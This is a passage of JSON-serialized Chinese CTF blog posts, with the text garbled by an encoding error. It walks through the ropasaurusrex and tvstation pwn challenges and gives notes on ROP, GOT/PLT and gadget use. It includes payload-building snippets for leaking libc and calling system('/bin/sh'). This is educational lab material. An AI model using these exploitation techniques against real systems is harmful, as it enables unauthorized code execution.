ropasaurusrex/","content":"\n1.å¸¸è§„checksecï¼Œåªå¼€å¯äº†ä¸€ä¸ªNXï¼Œä¸èƒ½ä½¿ç”¨shellcodeï¼ŒIDAåˆ†ææ¼æ´ï¼Œç¨‹åºçš„sub_80483F4()å‡½æ•°æ ˆæº¢å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nchar buf; // [esp+10h] [ebp-88h]\n------------------------------------------------------\nreturn read(0, &buf, 0x100u);\n```\n\næœ‰writeå‡½æ•°ï¼Œæ²¡æœ‰libcï¼Œgotè¡¨é‡Œæ²¡æœ‰systemï¼Œä¹Ÿæ²¡æœ‰int 80h/syscallï¼Œæ²¡æœ‰binshå­—ç¬¦ä¸²ã€‚\n\n2.è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨DynELFæ¥leaklibcï¼Œè¿›è€Œè·å–systemå‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œç„¶åå°±å¯ä»¥å†ç”¨readå‡½æ•°æ¥è¯»å–å­—ç¬¦ä¸²ã€‚\n\n3.é¦–å…ˆç¼–å†™leakå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯éœ€è¦è°ƒç”¨writeå‡½æ•°æ‰“å°éœ€è¦æ³„éœ²çš„åœ°å€\n\nå¸¸è§„çš„leakå‡½æ•°æ¨¡å¼ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef leak(addr):\n    payload = ''\n    payload += 'A'*n #padding\n    payload += p32(write_addr) #è°ƒç”¨write\n    payload += p32(start_addr) #writeè¿”å›åˆ°start\n    payload += p32(1) #writeç¬¬ä¸€ä¸ªå‚æ•°fd\n    payload += p32(addr) #writeç¬¬äºŒä¸ªå‚æ•°buf\n    payload += p32(8) #writeç¬¬ä¸‰ä¸ªå‚æ•°size\n    io.sendline(payload)\n    content = io.recv()[:8] #æ¥å—å†…å®¹è¯»å–é€šè¿‡writeæ‰“å°çš„åœ°å€\n    print(\"%#x -> %s\" %(addr, (content or '').encode('hex')))\n    #è¿™é‡Œæ‰“å°ä¸éœ€è¦ä¹Ÿå¯ä»¥ï¼Œåªæ˜¯å¯ä»¥æ‰“å°å‡ºæ¥è®©æˆ‘ä»¬çœ‹åˆ°writeæ‰“å°äº†ä»€ä¹ˆåœ°å€ï¼ŒåŸºæœ¬éƒ½æ‰“å°äº†\n    return content\n    #è¿™é‡Œreturnçš„contenæœ‰å¾ˆå¤šåœ°å€ï¼Œéœ€è¦é€šè¿‡ä¹‹åçš„DynELFæ¥lookupå¯¹åº”çš„åœ°å€\n```\n\nè¿™é‡Œçš„writeå‡½æ•°å¯ä»¥æ¢æˆputæˆ–è€…printfå‡½æ•°ï¼Œä½†æ˜¯å¦‚æœæ”¹å˜äº†ï¼Œé‚£ä¹ˆåé¢çš„å‚æ•°ä¸ªæ•°ä¹Ÿéœ€è¦å‘ç”Ÿæ”¹å˜ï¼Œå¯¹åº”æ‰“å°å‡½æ•°çš„å½¢å¼ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nssize_t write(int fd,const void *buf,size_t count);\nint puts(const char *s)\nint printf(const char*format, ......)ï¼›\n```\n\nå…·ä½“è¯·å‚è€ƒï¼š\n\nhttps://www.anquanke.com/post/id/85129\n\n4.æ¥ä¸‹æ¥å°±éœ€è¦åˆ›å»ºDynELFç±»æ¥ä½¿ç”¨\n\n```\n#æ³¨é‡Šå¤´\n\nd = DynELF(leak, elf = elf)\n#åˆ›å»ºDynELFç±»ï¼Œä¼ å…¥éœ€è¦æ³„éœ²çš„åœ°å€ï¼Œä»elfæ–‡ä»¶ä¸­è·å–\nsystem_addr = d.lookup('system', 'libc')\n```\n\n5.æ‰¾åˆ°system_addrä¹‹åï¼Œå°±å¯ä»¥é€šè¿‡å†æ¬¡åˆ©ç”¨æ ˆæº¢å‡ºæ¥è¯»å–å­—ç¬¦ä¸²ï¼Œå› ä¸ºä¹‹å‰writeçš„è¿”å›åœ°å€å·²ç»æ˜¯æœ€å¼€å§‹çš„startåœ°å€ã€‚å†æ¬¡è¿è¡Œåˆ°readå‡½æ•°è¯»å–ç¬¬äºŒæ¬¡çš„payloadï¼Œç»„æˆä¸ºï¼š\n\n```\n#æ³¨é‡Š\n\npayload = padding\npayload += read_addr #è¦†ç›–eipï¼Œå°†sub_80483F4å‡½æ•°çš„è¿”å›åœ°å€åŠ«æŒåˆ°readå‡½æ•°)\npayload += system_addr #ä½¿å¾—readå‡½æ•°çš„è¿”å›åœ°å€ä¸ºsystem)\npayload += p32(fd) #readå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼ŒåŒæ—¶ä¹Ÿå¯¹åº”systemå‡½æ•°çš„è¿”å›åœ°å€\npayload += p32(binsh_addr) #readå‡½æ•°è¯»å–è¿›binshçš„åœ°å€ï¼ŒåŒæ—¶ä¹Ÿå¯¹åº”systemå‡½æ•°çš„å‚æ•°\npayload += p32(size) #readå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œè¯»å–çš„å­—ç¬¦ä¸²å¤§å°ï¼Œäºsystemå‡½æ•°æ— å®é™…æ„ä¹‰ï¼Œä½†æ˜¯å¦‚æœsystemå‡½æ•°è¿”å›äº†ï¼Œé‚£ä¹ˆè¿™å°±æ˜¯è¿”å›ä¹‹åçš„eipï¼Œä¸‹ä¸€æ¡æ‰§è¡Œçš„ä»£ç åœ°å€ã€‚\n```\n\n6.ç¨‹åºæ€»æµç¨‹å¦‚ä¸‹ï¼š\n\nç”±äºç¬¬ä¸€æ®µPayloadæœ€åwriteè°ƒç”¨åè¿”å›åˆ°äº†startï¼Œæ‰€ä»¥åˆè°ƒç”¨sub_80483F4å‡½æ•°ï¼Œè¿›å…¥è¯»å–ç•Œé¢ï¼Œéœ€è¦è¾“å…¥ç¬¬äºŒæ®µpayloadæ ˆæº¢å‡ºï¼ŒåŠ«æŒsub_80483F4å‡½æ•°çš„è¿”å›åœ°å€eipä¸ºreadå‡½æ•°åœ°å€ï¼Œä»è€Œè¿›å…¥readå‡½æ•°ã€‚ä¹‹åå†æ¬¡åŠ«æŒreadå‡½æ•°çš„è¿”å›åœ°å€ä¸ºsystemå‡½æ•°ï¼Œå¹¶ä¸”å°†readçš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¯»å–è¿›çš„binshå­—ç¬¦ä¸²ä¹Ÿä¼ å…¥systemå‡½æ•°ï¼Œä»è€Œgetshellã€‚\n\n \n\n \n\nâ–²call _readå‡½æ•°å’Œç›´æ¥è°ƒç”¨read_pltçš„åŒºåˆ«ï¼š\n\n1.call _readå‡½æ•°ä¼špush eipï¼Œä¼šä½¿å¾—æ ˆä¸­ç»“æ„ä»æˆ‘ä»¬åŸæœ¬è®¾ç½®å¥½çš„ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npadding\n(call read_addr)_addr\nsystem_addr\nfd\nbinsh_addr\nsize\n```\n\nå˜æˆ:\n\n```\n#æ³¨é‡Šå¤´\n\npadding\n(call read_addr)_addr\n(call read_addr)_addrä¸‹ä¸€æ¡æŒ‡ä»¤\nsystem_addr\nfd\nbinsh_addr\nsize\n```\n\nè¿™ä¸ªeipæ²¡åŠæ³•æ”¹å˜ï¼Œå› ä¸ºæ˜¯callè¿™ä¸ªæŒ‡ä»¤å¸¦æ¥çš„ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´åœ¨readå‡½æ•°æ²¡åŠæ³•æ­£å¸¸è¯»å–å‚æ•°ï¼Œå¦‚æœå»æ‰system_addrï¼Œåˆä¼šå¯¼è‡´è¿”å›åˆ°callæŒ‡ä»¤ä¸‹ä¸€æ¡leaveè¦æ‰§è¡Œæ—¶ï¼Œebpä¼šæŒ‡å‘ä¸€ä¸ªpaddingï¼Œè¿™æ˜¯åœ¨readå‡½æ•°ä¸­å˜æˆçš„ï¼Œä»è€Œå¯¼è‡´leaveæŒ‡ä»¤ä¹Ÿå‡ºé”™ã€‚\n\n2.ä½†æ˜¯å¦‚æœç›´æ¥è°ƒç”¨read_pltï¼Œæ ˆä¸­ç»“æ„ä¸ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npadding\nread_plt_addr\nsystem_addr\nfd\nbinsh_addr\nsize\n```\n\nè¿™æ ·Readå‡½æ•°è¯»å–å®Œä¹‹åï¼Œè¿”å›æ—¶å°±ä¼šç›´æ¥è°ƒç”¨system_addrï¼Œå®Œå…¨ä¸ç”¨ç®¡ebpå˜æˆäº†ä»€ä¹ˆï¼ŒåŒæ—¶è¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥å°†binsh_addrä¼ ç»™systemï¼Œä¸€ä¸¾ä¸¤å¾—ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["Dynelf"],"categories":["PWN","Dynelf0x5"]},{"title":"ROPæ±‡æ€»","url":"/2021/08/14/ROPæ±‡æ€»/","content":"\nä¸€ã€32ä½ROPï¼š\n\n1.å¦‚æœæ˜¯ç›´æ¥è·³è½¬pltè¡¨ä¸­çš„åœ°å€ï¼Œé‚£ä¹ˆæ ˆçš„å¸ƒç½®é¡ºåºåº”è¯¥æ˜¯ï¼š\n\nsystemå‡½æ•°-systemå‡½æ•°çš„è¿”å›åœ°å€-sytemå‡½æ•°çš„å‚æ•°ã€‚\n\n2.ä½†å¦‚æœæ˜¯è·³è½¬call systemï¼Œé‚£ä¹ˆç”±äºcallæŒ‡ä»¤ä¼šè‡ªåŠ¨pushè¿›eipï¼Œåˆ™æ ˆå¸ƒç½®åº”è¯¥ä¸ºï¼š\n\ncall systemå‡½æ•°åœ°å€-systemå‡½æ•°å‚æ•°ã€‚\n\n(ä¸¤è€…ä¸å¤ªä¸€æ ·ï¼Œéœ€è¦åŠ ä»¥åŒºåˆ†ã€‚åé¢ä¼šæœ‰gotè¡¨å’Œpltçš„è¯¦ç»†è®²è§£)\n\n \n\näºŒã€64ä½ROPï¼š\n\néœ€è¦ä¼ å‚æŒ‡ä»¤ï¼špop rdi;retã€‚è¿™é‡Œå°±ä¸ç”¨ç®¡æ˜¯pltè¿˜æ˜¯calläº†ï¼Œå› ä¸ºä¼ å‚æ˜¯rdiä¼ å‚ï¼Œè¿”å›åœ°å€æ˜¯å•¥éƒ½æ²¡å…³ç³»ï¼Œå¤šå‚æ•°çš„éœ€è¦ä¸‡èƒ½gadgetã€‚\n\nâ–²64ä½ç¨‹åºä¸­å‡½æ•°å–å‚æ•°æ˜¯å–rdiä¸­å†…å®¹æŒ‡å‘çš„å†…å­˜ä¸­çš„å†…å®¹ï¼Œç›¸å½“äº*rdiï¼ŒåŒæ ·çš„32ä½ç¨‹åºä¸­å–å‚æ˜¯å–æ ˆä¸Šçš„å†…å®¹æŒ‡å‘çš„å†…å­˜ä¸­çš„å†…å®¹ï¼Œç›¸å½“äº*[ebp+var_0xh]ï¼Œæ‰€ä»¥ç›´æ¥è¾“å…¥binshå­—ç¬¦ä¸²æ¥èµ‹å€¼ç»™rdiæˆ–è€…èµ‹å€¼ç»™å‡½æ•°å‚æ•°è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºè¿™ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„åœ°å€ï¼Œè€Œæ˜¯å­—ç¬¦ä¸²çš„äºŒè¿›åˆ¶å½¢å¼ã€‚\n\n \n\nä¸‰ã€ä¸‡èƒ½gadget\n\n1.ä¼ å…¥gotè¡¨å’Œpltè¡¨çš„åŒºåˆ«ï¼š\n\nä¸‡èƒ½gadgetä¸­è°ƒç”¨æˆ‘ä»¬æƒ³è°ƒç”¨çš„å‡½æ•°ä¸ºcall qword ptr[r12+rbx*8]ï¼Œç¡¬ç¼–ç ä¸ºFFï¼Œæ˜¯å–r12ä¸­ä¿å­˜çš„å†…å®¹å½“ä½œä¸€ä¸ªåœ°å€aï¼Œè¿™ä¸ªåœ°å€aä¿å­˜çš„å†…å®¹åº”è¯¥æ˜¯ä¸€ä¸ªåœ°å€bï¼Œè¯¥åœ°å€bæŒ‡å‘çš„åœ°æ–¹æ‰æ˜¯å¯ä»¥è¢«æ‰§è¡Œçš„å®é™…ä»£ç ä½ç½®ã€‚\n\nä¾‹å¦‚:\n\n```\n#æ³¨é‡Šå¤´\n\nr12:    got_a\ngot_a:  0x111\n0x111:  mov a b\n```\n\næ‰€ä»¥call qword ptr[r12+rbx*8]å®é™…æ‰§è¡Œè·³è½¬åˆ°çš„ä½ç½®æ˜¯0x111ï¼Œè€Œæ‰§è¡Œçš„ä»£ç æ˜¯mov a b;åªèƒ½ä¼ å…¥gotè¡¨ï¼Œå¦‚æœä¼ å…¥pltè¡¨ï¼Œé‚£ä¹ˆåº”è¯¥å¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nr12:          plt_a\nplt_a:        jmp got_a\njmp got_a:    æ— æ•ˆç¼–ç åœ°å€\n#è¿™ä¸ªjmp got_aè½¬æ¢æˆç¡¬ç¼–ç å°±ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆåœ°å€\n```\n\n2.ä¸åŒçš„callåŒºåˆ«ï¼š\n\nFFçš„callåé¢è·Ÿçš„æ˜¯åœ°å€çš„åœ°å€ã€‚ä¾‹å¦‚call [func], è·³è½¬çš„åœ°æ–¹å°±åº”è¯¥æ˜¯funcè¿™ä¸ªåœ°å€é‡Œä¿å­˜çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯*funcã€‚\n\nE8çš„callåé¢è·Ÿçš„æ˜¯åœ°å€ã€‚ä¾‹å¦‚call funcï¼Œè·³è½¬çš„åœ°æ–¹å°±æ˜¯funcçš„å¼€å¤´ã€‚\n\nâ–²æ™®é€šcallï¼ŒEBç¼–ç ï¼šcall fun_c(æœ€å¸¸ç”¨çš„)\n\nfun_cï¼š mov a b\n\nç›¸å½“äºç›´æ¥è·³è½¬åˆ°fun_cè¿™ä¸ªåœ°å€æ¥æ‰§è¡Œä»£ç \n\n \n\n \n\nå››ã€mainå‡½æ•°è¿”å›çš„ROPï¼š\n\n1.æœ€å¼€å§‹å¯åŠ¨ç¨‹åºæ—¶ï¼Œmainå‡½æ•°æ ˆä¸æ˜¯æ±‡ç¼–ä»£ç å†™çš„é‚£ä¹ˆå¤§ï¼Œè€Œåº”è¯¥å†å¤§ä¸¤ä¸ª0x04ç”¨æ¥å­˜æ”¾å…¨å±€åç§»ï¼Œæ‰€ä»¥è®¡ç®—åç§»æ—¶å°±éœ€è¦å†åŠ ä¸Šä¸¤ä¸ª0x04\n\n2.é€šè¿‡å†æ¬¡è¿›å…¥mainå‡½æ•°ä¸­ä¹‹åï¼Œç¨‹åºåªä¼šä¾ç…§æ±‡ç¼–ä»£ç æ¥æ„é€ Mainhå‡½æ•°æ ˆï¼Œæ‰€ä»¥è¿™ä¸€æ¬¡é‡Œçš„mainå‡½æ•°æ ˆä¸­å°±æ²¡æœ‰å…¨å±€åç§»çš„ä¸œè¥¿äº†ï¼Œæ­£å¸¸è®¡ç®—åç§»ã€‚\n\n \n\n \n\näº”ã€æŠ€å·§æ€§ï¼š\n\n1.é€šè¿‡è¦†ç›–è¿”å›åœ°å€è°ƒç”¨å‡½æ•°æ—¶ï¼Œå¯ä»¥æ³¨æ„ä¸Šä¸€ä¸ªå‡½æ•°æ ˆä¸­çš„espçš„ä½ç½®ï¼Œç„¶åç›´æ¥é€šè¿‡Popç­‰æ“ä½œç»§ç»­å¾€ä¸‹retnåˆ°è¾“å…¥çš„payloadä¸­çš„å‡½æ•°åœ°å€ã€‚(RedHat 2017-pwn1)\n\n2.ropä¸»è¦æ˜¯æ‰¾systemå‡½æ•°å’Œbinshå­—ç¬¦ä¸²ï¼Œæ²¡æœ‰çš„è¯å…¶å®ç”¨int80å¯ä»¥ä»£æ›¿systemï¼Œç„¶åsh\\bashä»€ä¹ˆçš„ä¹Ÿå¯ä»¥ä»£æ›¿binshå­—ç¬¦ä¸²ã€‚\n\n3.ä½¿ç”¨int80çš„è¯éœ€è¦è®¾ç½®å¯„å­˜å™¨ï¼ŒåŒæ ·å¦‚æœæœ‰å…¶å®ƒå¯ä»¥ç”¨åˆ°çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¯ä»¥é€šè¿‡ï¼š\n\nhttp://syscalls.kernelgrok.com/ è¿™ä¸ªæ¥æŸ¥æ‰¾\n\n4.onegadgetéœ€è¦æ¡ä»¶æ»¡è¶³ï¼Œå¯ä»¥ç›´æ¥æŸ¥ï¼šone_gadget libcæ–‡ä»¶ï¼Œç„¶åé€šè¿‡è°ƒè¯•æˆ–è€…IDAçœ‹æ±‡ç¼–ï¼Œè§‚å¯Ÿåˆ°è¾¾è°ƒç”¨onegadgetçš„æ—¶å€™æ¡ä»¶æ»¡ä¸æ»¡è¶³ã€‚\n\n5.æŸ¥æ‰¾ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\none_gadget libc_so.6\nROPgadget --binary file | grep \"pop eax ; pop ebx ; pop esi ; pop edi ; ret\"\n```\n\n \n\n \n\n \n\n \n\næ€»ç»“ï¼š\n\næ‰€ä»¥ä¸‡èƒ½gadgetä¸­é€šè¿‡r12ï¼Œä¼ å…¥è·³è½¬å‡½æ•°çš„åœ°å€åªèƒ½æ˜¯å‘ç”Ÿå»¶è¿Ÿç»‘å®šä¹‹åçš„gotè¡¨åœ°å€ï¼Œè€Œä¸èƒ½æ˜¯pltè¡¨åœ°å€æˆ–è€…æ˜¯æ²¡æœ‰å‘ç”Ÿå»¶è¿Ÿç»‘å®šçš„gotè¡¨åœ°å€ï¼Œ(å»¶è¿Ÿç»‘å®šåªèƒ½é€šè¿‡pltè¡¨æ¥æ“ä½œï¼Œæ²¡æœ‰å‘ç”Ÿå»¶è¿Ÿç»‘å®šä¹‹å‰ï¼Œè¯¥gotè¡¨ä¸­çš„å†…å®¹æ˜¯ç­‰åŒäºæ— æ•ˆçš„ï¼Œåªæ˜¯ä¸€ä¸ªexternæ®µçš„åç§»åœ°å€ï¼Œé™¤éè¯¥å‡½æ•°funcæ˜¯é™æ€ç¼–è¯‘è¿›ç¨‹åºé‡Œé¢çš„ï¼Œé‚£ä¹ˆgotè¡¨ä¸­çš„å†…å®¹å°±æ˜¯è¯¥å‡½æ•°çš„çœŸå®æœ‰æ•ˆåœ°å€ï¼Œä¸ä¼šå‘ç”Ÿå»¶è¿Ÿç»‘å®šã€‚)å› ä¸ºpltè¡¨ä¸­çš„å†…å®¹è½¬æ¢æˆç¡¬ç¼–ç å‹æ ¹å°±ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆåœ°å€ï¼Œæ›´åˆ«è¯´è·³è½¬åˆ°è¯¥åœ°å€ä¿å­˜çš„å†…å®¹çš„åœ°æ–¹äº†ã€‚æœ‰äººè¯´è·³è½¬åˆ°pltè¡¨æ‰§è¡Œçš„å°±æ˜¯è·³è½¬gotè¡¨ï¼Œé‚£åº”è¯¥æ˜¯ä¸€æ ·çš„å•Šï¼Œä½†FFçš„callå¹¶ä¸æ˜¯è·³è½¬åˆ°pltæ¥æ‰§è¡Œé‡Œé¢çš„ä»£ç ï¼Œè€Œæ˜¯å–pltè¡¨ä¸­å†…å®¹å½“ä½œä¸€ä¸ªåœ°å€å†è·³è½¬åˆ°è¯¥åœ°å€æ¥æ‰§è¡Œä»£ç ï¼Œæ‰€ä»¥æœ‰æ—¶å€™éœ€è¦çœ‹æ±‡ç¼–ä»£ç æ¥å†³å®šç©¶ç«Ÿæ˜¯ä¼ å…¥gotè¡¨è¿˜æ˜¯ä¼ å…¥pltè¡¨ã€‚åŒæ ·ä¹Ÿå¯ä»¥çœ‹åˆ°pltè¡¨ä¸­çš„ç¡¬ç¼–ç æ˜¯FFï¼Œä¹Ÿå°±æ˜¯å¹¶ä¸æ˜¯è·³è½¬gotè¡¨ï¼Œè€Œæ˜¯å–gotè¡¨ä¸­ä¿å­˜çš„å†…å®¹å½“ä½œä¸€ä¸ªåœ°å€å†æ¥è·³è½¬ã€‚\n\néœ€è¦è·³è½¬å‡½æ•°æ—¶ï¼Œæœ‰[]çš„-åªèƒ½ä¼ gotè¡¨ï¼Œæ²¡[]çš„-ä¼ pltè¡¨(pltè¡¨æ›´å®‰å…¨å¥½ä½¿ï¼Œä½†åé¢æ ¼å¼åŒ–å­—ç¬¦ä¸²åŠ«æŒgotè¡¨åˆæœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼Œæƒ…å†µæ¯”è¾ƒå¤æ‚)ã€‚\n\néœ€è¦æ‰“å°çœŸå®å‡½æ•°åœ°å€æ—¶ï¼Œä¼ çš„ä¸€å®šæ˜¯gotè¡¨ï¼Œè¿™æ ·å°±ä¸€å®šæ²¡é”™ã€‚\n\nå½“æœ‰call eax;è¿™ç±»è¯­å¥æ—¶ï¼Œeaxä¸­ä¿å­˜çš„ä¸€å®šå¾—æ˜¯ä¸€ä¸ªæœ‰æ•ˆåœ°å€ï¼Œå› ä¸ºè¿™é‡Œçš„callç¡¬ç¼–ç ä¹Ÿæ˜¯0FFã€‚\n\n \n\n1.å¾€putså‡½æ•°ä¸­ä¼ å…¥å‡½æ•°åœ¨gotè¡¨ä¸­çš„åœ°å€ï¼ˆelf.gotï¼‰å‚æ•°å¯ä»¥æ‰“å°å‡ºè¢«åŠ è½½åœ¨Libcä¸­çš„å®é™…å†…å­˜åœ°å€ã€‚\n\n2.ç”¨è¦†ç›–è¿”å›åœ°å€retçš„å½¢å¼è°ƒç”¨å‡½æ•°éœ€è¦ç”¨å‡½æ•°åœ¨pltè¡¨ä¸­çš„åœ°å€ï¼Œï¼ˆelf.pltï¼‰è¿™æ˜¯åº“å‡½æ•°åœ°å€ï¼Œéœ€è¦å…ˆåˆ°pltä¸­ï¼Œç„¶åå†åˆ°gotè¡¨ä¸­ï¼Œè¿™æ˜¯æ­£å¸¸çš„å‡½æ•°è°ƒç”¨ã€‚\n\n3.ä½†å¦‚æœåœ¨gadgetä¸­ï¼Œåˆ™å¯ä»¥é€šè¿‡ç»™r12èµ‹å€¼æ¥è°ƒç”¨elf.gotè¡¨ä¸­çš„å‡½æ•°ï¼Œå› ä¸ºè¿™ä¸ªæ˜¯call qword ptr[r12+rbx*8]ï¼ŒæŒ‡å‘çš„æ˜¯å‡½æ•°åœ¨gotè¡¨ä¸­çœŸå®åœ°å€ï¼Œéœ€è¦çš„æ˜¯å‡½æ•°åœ¨gotè¡¨ä¸­çš„åœ°å€ã€‚å¦‚æœåªæ˜¯call addrï¼Œåˆ™åº”è¯¥æ˜¯callå‡½æ•°åœ¨pltè¡¨ä¸­çš„åœ°å€ã€‚\n\n4.ä¸‡èƒ½gadgetä¸€èˆ¬åœ¨_libc_csu_initä¸­ï¼Œæˆ–è€…initæˆ–è€…ç›´æ¥ROPgadgetæŸ¥ä¹Ÿå¯ä»¥\n","tags":["Fmstr"],"categories":["PWN","ROP0x3"]},{"title":"Security Fest CTF 2016-tvstation","url":"/2021/08/14/Security Fest CTF 2016-tvstation/","content":"\n \n\n1.é¢˜ç›®ç»™äº†libcåº“ï¼Œéœ€è¦æŸ¥çœ‹ä¸€ä¸‹ç‰ˆæœ¬ï¼Œç›´æ¥æ‹–åˆ°Linuxä¸­è¿è¡Œä¸€ä¸‹./libc.so.6_x64ï¼Œå°±å¯ä»¥çŸ¥é“æ˜¯libc2.24çš„ï¼Œä½†Linuxä¸­çš„libcæ²¡æœ‰è¯¥ç‰ˆæœ¬ï¼Œæ‰€ä»¥ç”¨pwndockeræ¥è¿æ¥è¿è¡Œã€‚å…·ä½“æ€ä¹ˆç”¨çœ‹ä¸‹æ–¹é“¾æ¥ï¼ŒåŒæ ·dockerä¹Ÿè‡ªè¡Œå­¦ä¹ ã€‚\n\nhttps://github.com/skysider/pwndocker\n\nå¦‚æœéœ€è¦ä½¿ç”¨åˆ°è¿™ä¸ªlibcè°ƒè¯•ï¼Œåˆ™åœ¨pythonä¸­è®¾ç½®ä¸‹åˆ—ä»£ç ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nio = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './tvstation'], env={\"LD_PRELOAD\":\"./libc.so.6_x64\"})\n```\n\n2.ç„¶åå¼€å§‹åˆ†ææ–‡ä»¶ï¼Œå¸¸è§„checksecï¼Œå¼€äº†NXï¼ŒIDAæ‰“å¼€æ–‡ä»¶æ‰¾æ¼æ´ï¼Œå‘ç°è¾“å…¥4è¿›å…¥debugå‡½æ•°åå¯ä»¥æ³„éœ²systemçš„å†…å­˜åœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nv0 = dlsym((void *)0xFFFFFFFFFFFFFFFFLL, \"system\");\nsprintf(fmsg, info, v0);\nv1 = strlen(fmsg);\nwrite(1, fmsg, v1);\n```\n\ndlsym()çš„å‡½æ•°åŸå‹æ˜¯\n\nvoid* dlsym(void* handle,const char* symbol);\n\nè¯¥å‡½æ•°åœ¨<dlfcn.h>æ–‡ä»¶ä¸­,handleæ˜¯ç”±dlopenæ‰“å¼€åŠ¨æ€é“¾æ¥åº“åè¿”å›çš„æŒ‡é’ˆï¼Œsymbolå°±æ˜¯è¦æ±‚è·å–çš„å‡½æ•°çš„åç§°ï¼Œå‡½æ•°è¿”å›å€¼æ˜¯void*,æŒ‡å‘å‡½æ•°çš„åœ°å€ï¼Œä¾›è°ƒç”¨ä½¿ç”¨ã€‚writeå‡½æ•°çš„fdæ˜¯1ï¼Œæ‰€ä»¥å°±ç›¸å½“äºç›´æ¥æ‰“å°åœ¨å±å¹•ä¸Šï¼Œè¿™é‡Œæ¶‰åŠlinuxç³»ç»Ÿè°ƒç”¨å·å†…å®¹ï¼Œå¯ä»¥ç›´æ¥æŸ¥linuxä¸‹çš„ç›®å½•/usr/include/asm/ä¸­çš„unistd_32.hå’Œunistd_64.hã€‚\n\nè¿™æ®µä»£ç çš„æ„æ€å°±æ˜¯æŠŠæŒ‡å‘systemå‡½æ•°çš„æŒ‡é’ˆè¿”å›ç»™v0,ç„¶åå°†v0æ ¼å¼åŒ–è¾“å‡ºç»™fmsgï¼Œä¹‹åå°†fmsgåŸå°ä¸åŠ¨æ‰“å°åœ¨å±å¹•ä¸Šï¼Œç¬¬ä¸€æ¬¡çœ‹åˆ°çŒœä¸å‡ºæ¥å¯ä»¥ç›´æ¥è¿è¡Œè¯¥æ–‡ä»¶è¯•è¯•å‘—ã€‚ä¹‹åä¼šè¿›å…¥ä¸€ä¸ªdebug_func()ï¼Œè¿™é‡Œå­˜åœ¨æ ˆæº¢å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n__int64 buf; // [rsp+0h] [rbp-20h]\nreturn read(0, &buf, 0xC8uLL);\n```\n\n3.ç°åœ¨æœ‰äº†systemçš„å†…å­˜åœ°å€å’Œæ ˆæº¢å‡ºï¼Œå°±å·®/bin/shå­—ç¬¦ä¸²äº†ã€‚è¿™é‡Œç”¨IDAæ‰“å¼€é¢˜ç›®ç»™çš„libcæ–‡ä»¶ï¼Œå¯ä»¥æ‰¾åˆ°bin/shå­—ç¬¦ä¸²çš„åœ°å€binsh_libc_addrå’Œsystemçš„åœ°å€system_libc_addrã€‚æ‰€ä»¥è¿™å°±ç›¸å½“äºæœ‰systemçš„è¢«libcåŠ è½½çš„çœŸå®åœ°å€ï¼Œé‚£ä¹ˆsystemçš„çœŸå®system_addrå‡å»system_libc_addrå°±å¯ä»¥å¾—åˆ°Libcè¢«åŠ è½½è¿›æ¥çš„é¦–åœ°å€libc_start_addrã€‚å³ç°æŒæ¡åœ°å€ï¼šlibc_start_addrï¼Œsystem_addrï¼Œsystem_libc_addrï¼Œbinsh_libc_addré€šè¿‡è®¡ç®—å¯å¾—ï¼šbinsh_addr = system_addr - system_libc_addr + binsh_libc_addrã€‚è¿™ä¸æ˜¯æ ˆæº¢å‡ºæœ‰äº†ï¼Œsystemå‡½æ•°å’Œbinshå­—ç¬¦ä¸²çš„çœŸå®åœ°å€æœ‰äº†ï¼Œè¿™ä¸ç›´æ¥getshellå°±å®Œäº‹äº†å—ï¼Œé—¹å•¥å‘¢ï¼Œè¿™ç ´é¢˜ç›®ï¼Œæ²¡ç‚¹æŠ€æœ¯å«é‡ã€‚\n\n4.ä½†ç¨‹åºè¿˜æ˜¯å¾—èµ°èµ°ï¼Œ64ä½ç¨‹åºï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨ROPgadgetè¡¨æ¥æŸ¥æ‰¾pop rdi ; retè¿™ä¸ªä»£ç æ‰€åœ¨çš„åœ°å€ï¼Œä¹Ÿæ˜¯åœ¨Libcä¸­æŸ¥æ‰¾åˆ°ï¼Œç„¶ååŠ ä¸Šlibc_start_addrå°±å¯å¾—åˆ°pop_rdi_addrã€‚\n\n5.ä¹‹åè®¡ç®—åç§»é‡ï¼Œè¿œç¨‹è°ƒè¯•ä¸‹è¿›è¡Œï¼Œpayloadä¾æ¬¡ä¸ºpadding + pop_rdi_addr + binsh_addr + system_addrã€‚\n\n6.å†è€ƒè™‘è¾“å…¥æƒ…å†µï¼šå…ˆåœ¨Linuxä¸‹è¿è¡Œï¼Œæ‰€ä»¥èƒ½çœ‹åˆ°éœ€è¦åœ¨æ¥æ”¶åˆ°â€: â€æ—¶å¯ä»¥è¾“å…¥4ï¼Œç„¶åè¿›å…¥åˆ°æ‰“å°system_addrï¼Œæ‰“å°å®Œä¹‹åï¼Œéœ€è¦ä»æ‰“å°å‡ºæ¥çš„systemåœ°å€è¯»å–è¿›æˆ‘ä»¬è®¾å®šçš„system_addrã€‚\n\n7.ç”±äºæ‰“å°æ 